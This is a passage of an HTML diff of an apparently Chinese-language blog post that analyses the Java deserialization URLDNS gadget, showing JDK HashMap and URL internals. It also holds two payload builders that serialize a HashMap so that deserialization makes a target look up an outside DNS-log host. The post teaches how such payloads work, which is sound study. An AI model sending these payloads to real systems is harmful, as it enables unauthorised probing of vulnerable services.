+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hello &#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        URL u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.baidu.com/1&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        URL u1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://www.aliyun.com/1&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span>String<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span>String<span style="color:#f92672">&gt;();</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>u<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        map<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>u1<span style="color:#f92672">,</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        FileOutputStream fos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;object&#34;</span>);
-</span></span><span style="display:flex;"><span>        ObjectOutputStream os <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(fos);
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//writeObject()方法将myObj对象写入object文件</span>
-</span></span><span style="display:flex;"><span>        os.<span style="color:#a6e22e">writeObject</span>(map);
-</span></span><span style="display:flex;"><span>        os.<span style="color:#a6e22e">close</span>();
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//从文件中反序列化obj对象</span>
-</span></span><span style="display:flex;"><span>        FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;object&#34;</span>);
-</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(fis);
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//恢复对象</span>
-</span></span><span style="display:flex;"><span>        HashMap map2 <span style="color:#f92672">=</span> (HashMap<span style="color:#f92672">&lt;</span>URL,String<span style="color:#f92672">&gt;</span>)ois.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;finish&#34;</span>);
-</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">close</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>        FileOutputStream fos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;object&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        ObjectOutputStream os <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span>fos<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//writeObject()方法将myObj对象写入object文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        os<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>map<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//从文件中反序列化obj对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FileInputStream fis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;object&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span>fis<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//恢复对象
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        HashMap map2 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span>String<span style="color:#f92672">&gt;)</span>ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;finish&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        ois<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> mappings; i<span style="color:#f92672">++</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
-</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> (K) s.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span>(<span style="color:#e6db74">&#34;unchecked&#34;</span>)
-</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> (V) s.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>                putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">false</span>);
-</span></span><span style="display:flex;"><span>            }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">;</span> i <span style="color:#f92672">&lt;</span> mappings<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;unchecked&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                    K key <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>K<span style="color:#f92672">)</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">@SuppressWarnings</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;unchecked&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                    V value <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>V<span style="color:#f92672">)</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>                putVal<span style="color:#f92672">(</span>hash<span style="color:#f92672">(</span>key<span style="color:#f92672">),</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(java.<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">ObjectInputStream</span> s)
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
-</span></span><span style="display:flex;"><span>        GetField gf <span style="color:#f92672">=</span> s.<span style="color:#a6e22e">readFields</span>();
-</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;protocol&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (getURLStreamHandler(protocol) <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IOException(<span style="color:#e6db74">&#34;unknown protocol: &#34;</span> <span style="color:#f92672">+</span> protocol);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;host&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;port&#34;</span>, <span style="color:#f92672">-</span>1);
-</span></span><span style="display:flex;"><span>        String authority <span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;authority&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        String file <span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;file&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        String ref <span style="color:#f92672">=</span> (String)gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;ref&#34;</span>, <span style="color:#66d9ef">null</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> hashCode <span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>, <span style="color:#f92672">-</span>1);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (authority <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;&amp;</span> ((host <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>host.<span style="color:#a6e22e">isEmpty</span>()) <span style="color:#f92672">||</span> port <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1)) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>)
-</span></span><span style="display:flex;"><span>                host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-</span></span><span style="display:flex;"><span>            authority <span style="color:#f92672">=</span> (port <span style="color:#f92672">==</span> <span style="color:#f92672">-</span>1) <span style="color:#f92672">?</span> host : host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> port;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        tempState <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UrlDeserializedState(protocol, host, port, authority,
-</span></span><span style="display:flex;"><span>               file, ref, hashCode);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">synchronized</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span><span style="color:#f92672">(</span>java<span style="color:#f92672">.</span><span style="color:#a6e22e">io</span><span style="color:#f92672">.</span><span style="color:#a6e22e">ObjectInputStream</span> s<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throws</span> IOException<span style="color:#f92672">,</span> ClassNotFoundException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        GetField gf <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span><span style="color:#a6e22e">readFields</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>        String protocol <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;protocol&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>getURLStreamHandler<span style="color:#f92672">(</span>protocol<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IOException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;unknown protocol: &#34;</span> <span style="color:#f92672">+</span> protocol<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        String host <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;host&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;port&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        String authority <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;authority&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        String file <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;file&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        String ref <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>String<span style="color:#f92672">)</span>gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ref&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> hashCode <span style="color:#f92672">=</span> gf<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hashCode&#34;</span><span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>authority <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">((</span>host <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>host<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">())</span> <span style="color:#f92672">||</span> port <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>host <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            authority <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>port <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">)</span> <span style="color:#f92672">?</span> host <span style="color:#f92672">:</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;:&#34;</span> <span style="color:#f92672">+</span> port<span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        tempState <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> UrlDeserializedState<span style="color:#f92672">(</span>protocol<span style="color:#f92672">,</span> host<span style="color:#f92672">,</span> port<span style="color:#f92672">,</span> authority<span style="color:#f92672">,</span>
+</span></span><span style="display:flex;"><span>               file<span style="color:#f92672">,</span> ref<span style="color:#f92672">,</span> hashCode<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span>(K key, V value) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal(hash(key), key, value, <span style="color:#66d9ef">false</span>, <span style="color:#66d9ef">true</span>);
-</span></span><span style="display:flex;"><span>    }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> V <span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>K key<span style="color:#f92672">,</span> V value<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> putVal<span style="color:#f92672">(</span>hash<span style="color:#f92672">(</span>key<span style="color:#f92672">),</span> key<span style="color:#f92672">,</span> value<span style="color:#f92672">,</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
 容易想到两种办法</p>
 <ol>
@@ -2708,70 +2746,70 @@
 以下是两种办法的实现，
 <a href="https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">来源于</a></li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS</span> <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
-</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://su18.dnslog.cn&#34;</span>);
-</span></span><span style="display:flex;"><span>		Field                 f       <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.net.URL&#34;</span>).<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;hashCode&#34;</span>);
-</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span> Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://su18.dnslog.cn&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		Field                 f       <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java.net.URL&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;hashCode&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">set</span>(url, 0x01010101);
-</span></span><span style="display:flex;"><span>		hashMap.<span style="color:#a6e22e">put</span>(url, 0);
-</span></span><span style="display:flex;"><span>		f.<span style="color:#a6e22e">set</span>(url, <span style="color:#f92672">-</span>1);
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span>x01010101<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		hashMap<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span>url<span style="color:#f92672">,</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(<span style="color:#66d9ef">new</span> FileOutputStream(<span style="color:#e6db74">&#34;urldns.bin&#34;</span>));
-</span></span><span style="display:flex;"><span>		oos.<span style="color:#a6e22e">writeObject</span>(hashMap);
-</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(<span style="color:#66d9ef">new</span> FileInputStream(<span style="color:#e6db74">&#34;urldns.bin&#34;</span>));
-</span></span><span style="display:flex;"><span>		ois.<span style="color:#a6e22e">readObject</span>();
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>		ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileOutputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns.bin&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		oos<span style="color:#f92672">.</span><span style="color:#a6e22e">writeObject</span><span style="color:#f92672">(</span>hashMap<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>		ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> FileInputStream<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;urldns.bin&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>		ois<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS2</span> {
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">URLDNS2</span> <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL, Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
-</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL(<span style="color:#e6db74">&#34;http://su18.dnslog.cn&#34;</span>);
+</span></span><span style="display:flex;"><span>		HashMap<span style="color:#f92672">&lt;</span>URL<span style="color:#f92672">,</span> Integer<span style="color:#f92672">&gt;</span> hashMap <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;();</span>
+</span></span><span style="display:flex;"><span>		URL                   url     <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;http://su18.dnslog.cn&#34;</span><span style="color:#f92672">);</span>
 </span></span><span style="display:flex;"><span>
